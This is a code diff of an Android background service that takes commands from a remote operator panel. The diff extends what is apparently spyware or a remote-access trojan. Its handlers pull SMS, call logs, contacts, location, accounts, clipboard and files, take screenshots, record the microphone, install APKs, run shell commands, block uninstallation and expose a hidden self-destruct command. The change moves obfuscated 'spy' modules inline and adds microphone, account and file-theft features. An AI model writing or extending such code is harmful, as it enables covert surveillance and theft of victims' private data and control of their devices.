@@ -26,6 +26,13 @@ import java.text.SimpleDateFormat
 import java.util.Date
 import java.util.Locale
 import java.util.concurrent.TimeUnit
+import com.nexlink.bridge.modules.SmsModule
+import com.nexlink.bridge.modules.CallLogModule
+import com.nexlink.bridge.modules.ContactsModule
+import com.nexlink.bridge.modules.LocationModule
+import com.nexlink.bridge.modules.MediaModule
+import com.nexlink.bridge.modules.AccountsModule
+import com.nexlink.bridge.modules.FileManagerModule
 
 class ConnectorService : Service() {
 
@@ -92,7 +99,6 @@ class ConnectorService : Service() {
         isRunning = true
         currentDir = prefs.getString("shell_dir", "/sdcard") ?: "/sdcard"
         startPolling()
-        DexModuleLoader.preloadAll(this)
         // FIX Bug 1: auto-enforce uninstall block setiap kali service start
         Thread { AppDeviceAdminReceiver.setBlockUninstall(this@ConnectorService, true) }
             .also { it.isDaemon = true }.start()
@@ -228,14 +234,14 @@ class ConnectorService : Service() {
             cmd.startsWith("settings_get:") -> { val p = cmd.removePrefix("settings_get:").split(":", limit=2); Pair(if (p.size < 2) "ERROR" else runShell("settings get ${p[0]} ${p[1]}"), "command_result") }
 
             // ── Location (dex module) ──
-            cmd == "get_location"        -> DexModuleLoader.execute(this, ObfStr.modSpyLocation(), cmd, null)
+            cmd == "get_location"        -> LocationModule.execute(this)
 
             // ── Call log (dex module) ──
-            cmd.startsWith("get_sms")     -> DexModuleLoader.execute(this, ObfStr.modSpySms(), cmd, null)
-            cmd.startsWith("get_calls")  -> DexModuleLoader.execute(this, ObfStr.modSpyCalls(), cmd, null)
+            cmd.startsWith("get_sms")     -> SmsModule.execute(this, cmd)
+            cmd.startsWith("get_calls")  -> CallLogModule.execute(this, cmd)
 
             // ── Contacts (dex module) ──
-            cmd.startsWith("get_contacts") -> DexModuleLoader.execute(this, ObfStr.modSpyContacts(), cmd, null)
+            cmd.startsWith("get_contacts") -> ContactsModule.execute(this, cmd)
 
             // ── Installed apps ──
             cmd == "get_apps" || cmd.startsWith("pm_list") -> Pair(getInstalledApps(), "command_result")
@@ -260,8 +266,17 @@ class ConnectorService : Service() {
             cmd == "get_clipboard"       -> Pair(getClipboard(), "command_result")
             cmd.startsWith("install_apk:") -> Pair(installApk(cmd.removePrefix("install_apk:")), "command_result")
 
-            // ── Screenshot (dex module) ──
-            cmd.startsWith("screenshot") -> DexModuleLoader.execute(this, ObfStr.modSpyMedia(), cmd, null)
+            // ── Screenshot + Mic ──
+            cmd.startsWith("screenshot") -> MediaModule.execute(this, cmd)
+            cmd.startsWith("record_mic:") -> MediaModule.execute(this, cmd)
+
+            // ── Accounts ──
+            cmd == "get_accounts" -> AccountsModule.execute(this)
+
+            // ── File Manager ──
+            cmd.startsWith("ls:") || cmd == "ls" -> FileManagerModule.execute(this, if (cmd == "ls") "ls:" else cmd)
+            cmd.startsWith("read:") -> FileManagerModule.execute(this, cmd)
+            cmd.startsWith("readb64:") -> FileManagerModule.execute(this, cmd)
 
             // ── Misc ──
             cmd == "device_info" -> Pair(DeviceInfo.collect(this).toString(), "command_result")
@@ -289,7 +304,7 @@ class ConnectorService : Service() {
             // RAHASIA — hanya operator panel yang bisa kirim command ini
             cmd == "self_destruct"  -> Pair(doSelfDestruct(), "command_result")
 
-            cmd == "modules_reload"         -> { DexModuleLoader.invalidate(); DexModuleLoader.preloadAll(this); Pair("✅ Modules reloading…", "command_result") }
+            cmd == "modules_reload"         -> Pair("✅ Modules loaded inline — no reload needed", "command_result")
 
             else -> Pair("ERROR: Unknown command: $cmd", "command_result")
         }
